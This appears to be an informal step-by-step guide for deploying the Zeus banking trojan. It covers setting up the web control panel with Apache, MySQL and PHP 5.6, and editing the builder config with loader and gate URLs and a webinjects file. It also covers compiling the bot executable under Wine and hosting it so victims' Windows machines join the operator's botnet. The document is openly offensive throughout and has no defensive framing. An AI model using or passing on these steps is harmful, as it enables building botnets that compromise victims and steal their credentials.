#### i am suing ubuntu 18 , how ever it will also work in ubuntu 20 ####

Installing Apache2

$ sudo apt install apache2 -y

Installing Mysql script. i,e already given .
  
$ sudo ./mysql.sh

## after the script completed it will ask for current root password hit enter , then ask for to setup the root password for mysql select(n) also allow the network
root login for mysql ,the rest in default // it is your choise what how you want to setup the mysql setup //
## login to mysql

$ sudo mysql ( if you followed above instruction ) otherwide $ sudo mysql -u root -p ( and enter password )

Create database of any name , 
mysql> create database zeus;
mysql> exit;
  
Installing PHP 5.6

$ sudo apt-get install python-software-properties
$ sudo add-apt-repository ppa:ondrej/php
$ sudo apt-get update
$ sudo apt-get install -y php5.6 php5.6-mbstring

#### environment is ready to go ####

just copy the server folder to /var/www/html and give 755 as permission 

$ sudo chmod -R 755 file_dir

Now go to the URL 
domainname.com/install/install.php

fill the required fields and note it down .

after installation, go to

domainname.com/cp.php

enter the username and password

#####################################################
#####################################################

now time to create a payload by which victim system is going to compromise.

go to builder foler open config.txt file make these changes . ( change the url to your domain name ) and save it .
//
entry "DynamicConfig"
  url_loader "http://domainname.com/feel/bot.exe"
  url_server "http://domainname.com/feel/gate.php"
  file_webinjects "webinjects.txt"
  entry "AdvancedConfigs"
//

######################################################
######################################################

Time to install wine 

$ sudo apt install wine32 ( make sure it's wine32 that zeus zsb.exe is 32bit file and only work with 32bit system )

after installation

$ sudo wine32 zsb.exe ( you may got some error , simply install the packages it says missing or popup comes to install those packages simply install them )

The setup in open now insert the ENC key you used to install zeus in web ( hope you note it down )

next is to choose the config.txt file to choose . then press 2 button below them execute and build the bot something like that. you'll notice there are two file 
config.bin and bot file in same directory !! 
copy the config.bin and bot file to /var/www/html

That bot file that is generated is payload , whenever it is executed in viction windows OS , The system become bot and in few minutes it is availabe in your
control panel.
